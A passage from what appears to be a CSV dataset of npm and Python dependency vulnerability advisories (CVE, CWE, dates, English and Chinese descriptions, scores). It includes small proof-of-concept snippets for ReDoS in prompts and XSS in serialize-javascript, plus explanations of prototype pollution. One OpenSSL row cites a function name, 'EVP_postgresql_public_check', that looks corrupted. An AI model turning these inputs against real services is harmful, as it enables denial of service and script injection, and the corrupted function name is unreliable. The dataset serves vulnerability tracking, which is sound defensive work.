The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `d3-color` to version 3.1.0 or higher.
## References
- [Github PR](https://github.com/d3/d3-color/pull/100)
- [Github PR](https://github.com/d3/d3-color/pull/99)
- [GitHub PR](https://github.com/d3/d3-color/pull/89)
- [Github Releases](https://github.com/d3/d3-color/releases/tag/v3.1.0)
",3,2
aimhubio_aim,cross-spawn,5.1.0,False,CVE-2024-21538,CWE-1333,2024-11-08,cross-spawn 是一个用于在 Node.js 环境中跨平台地扩展 child_process.spawn 的开源软件包。该软件包在处理用户输入时存在正则表达式拒绝服务（ReDoS）漏洞，这是由于输入的正则表达式在解析时没有进行恰当的输入验证所导致。该漏洞存在于 7.0.5 版本之前的 cross-spawn 包中，如果攻击者提供了一个特殊构造的大型字符串作为输入，可能会在解析过程中导致 CPU 使用率飙升，从而造成程序卡顿或崩溃。,2,2
aimhubio_aim,got,6.7.1,False,CVE-2022-33987,CWE-918,2022-06-18,"got是适用于 Node.js 的人性化且功能强大的 HTTP 请求库。
got 12.1.0 之前版本存在安全漏洞，该漏洞源于允许重定向到 UNIX 套接字。",3,2
aimhubio_aim,tmp,0.0.33,False,CVE-2025-54798,CWE-59,2025-08-07,tmp 是一个用于 Node.js 的临时文件和目录创建库。该漏洞存在于 tmp 组件 0.2.3 版本，主要由于 `_resolvePath` 函数未正确处理符号链接（symlink）路径解析，导致攻击者能够通过 `dir` 参数创建指向系统默认临时目录（tmpDir）外部的符号链接目录，从而绕过路径检查逻辑。具体来说，攻击者可以利用符号链接指向 tmpDir 外部的目录，触发 `_assertIsRelative` 检查失效，进而在未经授权的目录中创建临时文件或目录。该漏洞根本原因是组件缺乏对路径解析中符号链接的验证。,3,0
aimhubio_aim,loader-utils,1.2.3,False,CVE-2022-37601,CWE-1321,2022-10-12,"loader-utils是webpack开源的一个用于 webpack 加载器的实用程序。
webpack loader-utils 2.0.0版本存在安全漏洞，该漏洞源于parseQuery.js的parseQuerys函数中发现包含原型污染漏洞。",1,2
aimhubio_aim,prompts,2.4.0,False,CVE-2021-3868,CWE-1333,2021-10-08,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). An attacker that is able to provide a crafted input to the strip functionality may cause an application to consume an excessive amount of CPU.

### PoC
```
const strip = require('prompts/lib/util/strip.js');
for(var i = 1; i <= 5000; i++) {
var time = Date.now();
var attack_str = ""\u001B[""+"";"".repeat(i*1000);
strip(attack_str)
var time_cost = Date.now() - time;
console.log(""attack_str.length: "" + attack_str.length + "": "" + time_cost+"" ms"")
}
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
There is no fixed version for `org.webjars.npm:prompts`.
## References
- [GitHub PR](https://github.com/terkelg/prompts/pull/333)
- [GitHub Release](https://github.com/terkelg/prompts/releases/tag/v2.4.2)
",3,2
aimhubio_aim,immer,8.0.1,False,CVE-2021-3757,CWE-1321,2021-09-02,"Immer是Immer社区的一个基于Javascript的状态管理库。。
Immer 中存在代码问题漏洞，该漏洞源于产品易受对象原型属性控制不当的影响。攻击者可通过该漏洞导致信息泄露、拒绝服务。",2,2
aimhubio_aim,cross-spawn,7.0.3,False,CVE-2024-21538,CWE-1333,2024-11-08,cross-spawn 是一个用于在 Node.js 环境中跨平台地扩展 child_process.spawn 的开源软件包。该软件包在处理用户输入时存在正则表达式拒绝服务（ReDoS）漏洞，这是由于输入的正则表达式在解析时没有进行恰当的输入验证所导致。该漏洞存在于 7.0.5 版本之前的 cross-spawn 包中，如果攻击者提供了一个特殊构造的大型字符串作为输入，可能会在解析过程中导致 CPU 使用率飙升，从而造成程序卡顿或崩溃。,2,2
aimhubio_aim,rollup,1.32.1,False,CVE-2024-47068,CWE-79,2024-09-23,<p>Rollup 是一个流行的 JavaScript 模块打包工具。该漏洞 (CVE-2024-47068) 存在于 Rollup 3.29.5 和 4.22.4 版本之前的所有版本中，影响到包含 `import.meta` 属性的脚本在 CommonJS (CJS)、Universal Module Definition (UMD) 和 Immediately Invoked Function Expression (IIFE) 格式输出时。攻击者可以利用 DOM Clobbering 技术，通过操控 HTML 元素的属性 (如 `img` 标签中的 `name` 属性) 执行恶意代码。这种漏洞是由于 Rollup 在处理 `import.meta.url` 属性时没有进行适当的输入净化，从而使得恶意 HTML 属性覆盖全局变量，导致跨站脚本攻击。</p><p>我们在使用 import.meta.url 打包脚本或使用从 cjs/umd/iife 格式的代码中发出和引用资产文件的插件时，发现了 rollup 中的 DOM Clobbering 漏洞。DOM Clobbering 工具可能导致跨站脚本攻击（XSS），尤其是在存在无脚本攻击者控制的 HTML 元素（例如，带有未清理名称属性的 img 标签）的网页中。</p>,3,0
aimhubio_aim,ejs,2.7.4,False,CVE-2024-33883,CWE-693,2024-04-28,"Github ejs是嵌入式 JavaScript 模板。
ejs(Embedded JavaScript templates) 3.1.10之前版本存在安全漏洞，该漏洞源于缺乏一定的污染保护。",3,1
aimhubio_aim,tar,6.1.0,False,,CWE-400,2021-08-05,"## Overview
[tar](https://www.npmjs.com/package/tar) is a full-featured Tar for Node.js.

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). When stripping the trailing slash from `files` arguments, the  `f.replace(/\/+$/, '')` performance of this function can exponentially degrade when `f` contains many `/` characters resulting in ReDoS. 

This vulnerability is not likely to be exploitable as it requires that the untrusted input is being passed into the `tar.extract()` or `tar.list()` array of entries to parse/extract, which would be unusual.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `tar` to version 6.1.4, 5.0.8, 4.4.16 or higher.
## References
- [GitHub Commit](https://github.com/npm/node-tar/commit/06cbde5935aa7643f578f874de84a7da2a74fe3a)
- [GitHub Commit](https://github.com/npm/node-tar/commit/adf35115dbc6e7a479fe3c38f859baf6ffff7a7a)
- [GitHub Commit](https://github.com/npm/node-tar/commit/d3d5a4e4560f18131e64fc62f5a281b238ef2ecf)
",4,0
aimhubio_aim,serialize-javascript,5.0.1,False,,CWE-79,2024-01-09,"## Overview
[serialize-javascript](https://www.npmjs.com/package/serialize-javascript) is a package to serialize JavaScript to a superset of JSON that includes regular expressions and functions.

Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to unsanitized URLs. An Attacker can introduce unsafe `HTML` characters through non-http `URLs`.
## PoC
```js
const serialize = require('serialize-javascript');

let x = serialize({
    x: new URL(""x:</script>"")
});

console.log(x)
```
## Details

A cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.

This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.

Injecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.

Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.
 
The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. 

### Types of attacks
There are a few methods by which XSS can be manipulated:

|Type|Origin|Description|
|--|--|--|
|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|
|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| 
|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|
|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|

### Affected environments
The following environments are susceptible to an XSS attack:

* Web servers
* Application servers
* Web application environments

### How to prevent
This section describes the top best practices designed to specifically protect your code: 

* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. 
* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. 
* Give users the option to disable client-side scripts.
* Redirect invalid requests.
* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.
* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.
* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.

## Remediation
Upgrade `serialize-javascript` to version 6.0.2 or higher.
## References
- [GitHub Commit](https://github.com/yahoo/serialize-javascript/commit/f27d65d3de42affe2aac14607066c293891cec4e)
- [GitHub Issue](https://github.com/yahoo/serialize-javascript/issues/172)
",3,0
aimhubio_aim,serialize-javascript,5.0.1,False,CVE-2024-11831,CWE-79,2025-02-10,"Serialize JavaScript是Yahoo开源的一个将 JavaScript 序列化为包含正则表达式和函数的 JSON 超集。
Serialize JavaScript存在跨站脚本漏洞，该漏洞源于没有正确清理某些输入。攻击者利用该漏洞可以注入恶意代码。",3,0
aimhubio_aim,webpack-dev-server,3.11.1,False,CVE-2025-30359,CWE-749,2025-06-03,"webpack-dev-server是webpack开源的一个提供webpack的应用程序。
webpack-dev-server 5.2.1之前版本存在安全漏洞，该漏洞源于用户访问恶意网站时可能被窃取源代码。",3,0
aimhubio_aim,ws,6.2.2,False,CVE-2024-37890,CWE-476,2024-06-16,Node.js的ws模块是一个开源的WebSocket客户端和服务器实现。在存在漏洞的版本中，攻击者可以发送包含超过server.maxHeadersCount阈值数量的头的请求，从而使得ws服务器崩溃。,2,2
aimhubio_aim,cross-spawn,6.0.5,False,CVE-2024-21538,CWE-1333,2024-11-08,cross-spawn 是一个用于在 Node.js 环境中跨平台地扩展 child_process.spawn 的开源软件包。该软件包在处理用户输入时存在正则表达式拒绝服务（ReDoS）漏洞，这是由于输入的正则表达式在解析时没有进行恰当的输入验证所导致。该漏洞存在于 7.0.5 版本之前的 cross-spawn 包中，如果攻击者提供了一个特殊构造的大型字符串作为输入，可能会在解析过程中导致 CPU 使用率飙升，从而造成程序卡顿或崩溃。,2,2
aimhubio_aim,ip,1.1.5,False,CVE-2024-29415,CWE-918 CWE-941,2024-05-27,"在Node.js中，ip包（版本2.0.1及之前）由于不正确地将某些IP地址（如127.1, 01200034567, 012.1.2.3, 000:0:0000::01和::fFFf:127.0.0.1）分类为全球可路由，从而可能允许服务器端请求伪造（SSRF）。需要注意的是，这个问题是由于CVE-2023-42282修复不完全而引发的。",2,1
aimhubio_aim,on-headers,1.0.2,False,CVE-2025-7339,CWE-241,2025-07-17,"on-headers是jshttp开源的一个应用软件。
on-headers 1.1.0版本存在安全漏洞，该漏洞源于传递数组到response.writeHead时可能无意修改响应头。",3,0
aimhubio_aim,http-proxy-middleware,0.19.1,False,CVE-2025-32996,CWE-670,2025-04-15,http-proxy-middleware 是一个用于 Node.js 的中间件库，主要用于创建代理服务器。该漏洞出现在 2.0.8 之前的版本和 3.x 版本的 3.0.4 之前的版本中，原因是代码中的 'writeBody' 函数可以被调用两次，因为没有使用 'else if' 语句，从而导致逻辑混淆。此漏洞可能允许多个同一请求的体内容被错误地处理。,3,0
aimhubio_aim,http-proxy-middleware,0.19.1,False,CVE-2025-32997,CWE-754,2025-04-15,http-proxy-middleware 是一个用于 Node.js 的中间件，用于创建代理服务器。在版本 2.0.9 之前和 3.x 的 3.0.5 之前，当 bodyParser 处理失败时，fixRequestBody 仍然会继续执行。该漏洞源于错误的控制逻辑，未能正确处理 bodyParser 的失败，导致潜在的安全问题。攻击者可以利用这一漏洞，发送特制的请求，可能导致敏感信息泄露或服务逻辑被错误处理。,3,0
aimhubio_aim,http-proxy-middleware,0.19.1,False,CVE-2024-21536,CWE-400,2024-10-19,http-proxy-middleware 是用于 connect、express、next.js 等的 Node.js http 代理中间件。此组件在 http-proxy-middleware 2.0.7之前版本和3.0.0版本至3.0.3之前版本存在安全漏洞。导致此漏洞的根本原因是未能正确处理某些输入，可能会被恶意攻击者利用，从而导致系统崩溃。,2,2
aimhubio_aim,node-forge,0.10.0,False,,CWE-1321,2022-01-08,"### Impact
The `forge.debug` API had a potential prototype pollution issue if called with untrusted input. The API was only used for internal debug purposes in a safe way and never documented or advertised.  It is suspected that uses of this API, if any exist, would likely not have used untrusted inputs in a vulnerable way.

### Patches
The `forge.debug` API and related functions were removed in 1.0.0.

### Workarounds
Don't use the `forge.debug` API directly or indirectly with untrusted input.

### References
- https://www.huntr.dev/bounties/1-npm-node-forge/

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [forge](https://github.com/digitalbazaar/forge).
* Email us at support@digitalbazaar.com.",4,-2
aimhubio_aim,node-forge,0.10.0,False,,CWE-601,2022-01-08,"### Impact
The regex used for the `forge.util.parseUrl` API would not properly parse certain inputs resulting in a parsed data structure that could lead to undesired behavior.

### Patches
`forge.util.parseUrl` and other very old related URL APIs were removed in 1.0.0 in favor of letting applications use the more modern WHATWG URL Standard API.

### Workarounds
Ensure code does not directly or indirectly call `forge.util.parseUrl` with untrusted input.

### References
- https://www.huntr.dev/bounties/41852c50-3c6d-4703-8c55-4db27164a4ae/

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [forge](https://github.com/digitalbazaar/forge)
* Email us at support@digitalbazaar.com
",4,-2
aimhubio_aim,node-forge,0.10.0,False,,CWE-1321,2022-01-09,"## Overview
[node-forge](https://github.com/digitalbazaar/forge) is a JavaScript implementations of network transports, cryptography, ciphers, PKI, message digests, and various utilities.

Affected versions of this package are vulnerable to Prototype Pollution via the `forge.debug` API if called with untrusted input.

## Details

Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.

There are two main ways in which the pollution of prototypes occurs:

-   Unsafe `Object` recursive merge
    
-   Property definition by path
    

### Unsafe Object recursive merge

The logic of a vulnerable recursive merge function follows the following high-level model:
```
merge (target, source)

  foreach property of source

    if property exists and is an object on both the target and the source

      merge(target[property], source[property])

    else

      target[property] = source[property]
```
<br>  

When the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.

Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.

`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.

### Property definition by path

There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`

If the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.

## Types of attacks

There are a few methods by which Prototype Pollution can be manipulated:

| Type |Origin  |Short description |
|--|--|--|
| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |
 |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|
|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|

## Affected environments

The following environments are susceptible to a Prototype Pollution attack:

-   Application server
    
-   Web server

-   Web browser
    

## How to prevent

1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.
    
2.  Require schema validation of JSON input.
    
3.  Avoid using unsafe recursive merge functions.
    
4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.
    
5.  As a best practice use `Map` instead of `Object`.

### For more information on this vulnerability type:

[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)

## Remediation
Upgrade `node-forge` to version 1.0.0 or higher.
## References
- [GitHub Commit](https://github.com/digitalbazaar/forge/commit/51228083550dde97701ac8e06c629a5184117562)
",3,0
aimhubio_aim,node-forge,0.10.0,False,CVE-2022-24773,CWE-347,2022-03-18,"Digital Bazaar Forge是美国Digital Bazaar公司的一个 Tls 在 Javascript 中的本机实现以及用于编写基于加密和网络密集型 Web 应用程序的开源工具。
Digital Bazaar Forge1.3.0之前版本存在数据伪造问题漏洞，该漏洞源于SA PKCS#1 v1.5 签名验证码无法正确检查 DigestInfo 以获得正确的 ASN.1 结构。攻击者可以发送特殊的签名利用该漏洞以验证包含无效结构但有效摘要的签名。",3,2
aimhubio_aim,node-forge,0.10.0,False,CVE-2022-24771,CWE-347,2022-03-18,"Digital Bazaar Forge是美国Digital Bazaar公司的一个 Tls 在 Javascript 中的本机实现以及用于编写基于加密和网络密集型 Web 应用程序的开源工具。
Digital Bazaar Forge 1.3.0 版本之前 RSA PKCS 存在数据伪造问题漏洞，该漏洞源于 RSA PKCS 签名验证码对摘要算法结构的检查较为宽松。攻击者可以通过精心设计的结构窃取填充字节并在使用低公共指数时使用 PKCS#1 编码消息的未检查部分来伪造签名。",2,2
aimhubio_aim,node-forge,0.10.0,False,CVE-2022-24772,CWE-347,2022-03-18,"Digital Bazaar Forge是美国Digital Bazaar公司的一个 Tls 在 Javascript 中的本机实现以及用于编写基于加密和网络密集型 Web 应用程序的开源工具。
Digital Bazaar Forge 1.3.0之前版本存在数据伪造问题漏洞，该漏洞源于RSA PKCS#1 v1.5 签名验证码在解码 `DigestInfo` ASN.1 结构后不检查尾随垃圾字节。攻击者可以删除填充字节利用该漏洞添加垃圾数据以伪造签名。",2,2
aimhubio_aim,async,2.6.4,False,CVE-2024-39249,CWE-1333,2024-07-01,"Async是英国Caolan McMahon个人开发者的一个实用模块。用于使用异步 JavaScript。
Async 2.6.4及之前版本和3.2.5及之前版本存在安全漏洞，该漏洞源于在解析自动注入函数中的函数时容易受到正则表达式拒绝服务（ReDoS）攻击。",3,2
aimhubio_aim,webpack-dev-middleware,3.7.3,False,CVE-2024-29180,CWE-22,2024-03-21,"webpack-dev-middleware是webpack开源的一个 express 风格的开发中间件。用于 webpack 捆绑包，并允许提供从 webpack 发出的文件。
webpack-dev-middleware 7.1.0、6.1.2 和 5.3.4 之前版本存在安全漏洞，该漏洞源于webpack -dev-middleware中间件在返回本地文件之前没有充分验证提供的 URL 地址，导致路径遍历。",2,0
aimhubio_aim,ws,7.5.0,False,CVE-2024-37890,CWE-476,2024-06-16,Node.js的ws模块是一个开源的WebSocket客户端和服务器实现。在存在漏洞的版本中，攻击者可以发送包含超过server.maxHeadersCount阈值数量的头的请求，从而使得ws服务器崩溃。,2,2
aimhubio_aim,nwsapi,2.2.0,False,,CWE-400,2022-06-15,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) when it is provided the invalid selector `_:-ms-fullscreen`. This triggers an infinite loop.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `nwsapi` to version 2.2.1 or higher.
## References
- [GitHub Commit](https://github.com/dperini/nwsapi/commit/ab9cde1eb05ec9badfc3abaf15687b1a6f9e9ad3)
- [GitHub Issue](https://github.com/dperini/nwsapi/issues/46#issuecomment-1134223659)
",3,0
aimhubio_aim,loader-utils,1.4.0,False,CVE-2022-37601,CWE-1321,2022-10-12,"loader-utils是webpack开源的一个用于 webpack 加载器的实用程序。
webpack loader-utils 2.0.0版本存在安全漏洞，该漏洞源于parseQuery.js的parseQuerys函数中发现包含原型污染漏洞。",1,2
ajenti_ajenti,cryptography,,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
ajenti_ajenti,cryptography,,True,CVE-2016-9243,CWE-20,2016-11-01,"Cryptography是一个用于Python开发的加密工具包。HKDF是其中的一个基于HMAC的密钥导出函数。
Cryptography 1.5.2之前的版本中的HKDF存在安全漏洞。攻击者可利用该漏洞获取敏感信息的访问权限或绕过安全限制，执行未授权的操作。",2,2
ajenti_ajenti,cryptography,,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
ajenti_ajenti,cryptography,,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
ajenti_ajenti,cryptography,,True,,CWE-415,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key. (related to CVE-2016-0705)

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
